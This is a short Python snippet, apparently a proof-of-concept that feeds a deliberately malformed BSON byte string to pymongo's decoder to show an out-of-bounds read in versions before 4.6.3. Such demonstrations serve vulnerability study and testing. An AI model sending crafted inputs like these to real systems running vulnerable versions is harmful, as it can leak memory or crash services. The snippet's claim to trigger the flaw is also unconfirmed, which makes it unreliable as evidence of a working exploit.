import pymongo
from bson import BSON

# Example of potentially unsafe BSON deserialization with a vulnerable version of pymongo
# Crafting a payload that could exploit the vulnerability
malicious_data = b'\x16\x00\x00\x00\x02name\x00\x05\x00\x00\x00Alice\x00\x00\xff\xff\xff'  # Invalid BSON data

# This could lead to an out-of-bounds read in the vulnerable version (before 4.6.3)
try:
    document = BSON(malicious_data).decode()
    print(document)
except Exception as e:
    print(f'Error: {e}')